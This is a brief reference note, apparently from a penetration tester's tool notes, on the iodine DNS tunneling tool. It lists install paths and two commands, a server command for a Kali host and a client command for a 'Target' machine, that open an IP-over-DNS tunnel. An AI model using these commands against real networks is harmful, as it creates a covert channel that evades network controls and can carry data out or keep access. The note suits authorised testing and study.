---
tags: [tool, tunneling]
tool: iodine
category: Tunneling
installed: true
---

# iodine - DNS Tunneling

## Overview
Tunnel IPv4 over DNS

## Location
/usr/bin/iodined (server)
/usr/bin/iodine (client)

## Usage

### Server (Kali)
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

### Client (Target)
iodine -f -P password YOUR_IP tunnel.domain.com
